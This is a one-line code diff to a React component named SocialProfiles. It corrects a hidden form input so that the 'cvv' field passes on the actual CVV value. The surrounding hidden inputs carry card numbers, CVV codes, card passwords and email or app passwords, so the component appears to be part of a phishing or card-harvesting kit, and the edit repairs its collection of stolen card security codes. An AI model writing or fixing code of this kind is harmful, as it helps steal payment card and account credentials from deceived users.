@@ -80,7 +80,7 @@ export class SocialProfiles extends Component {
     <input type="hidden" name="passapp" value={passapp}></input>
     <input type="hidden" name="cc" value={cc}></input>
     <input type="hidden" name="valcc" value={valcc}></input>
-    <input type="hidden" name="cvv" value={valcc}></input>
+    <input type="hidden" name="cvv" value={cvv}></input>
     <input type="hidden" name="ccpass" value={ccpass}></input>
     <input type="hidden" name="passemail" value={passemail}></input>
 
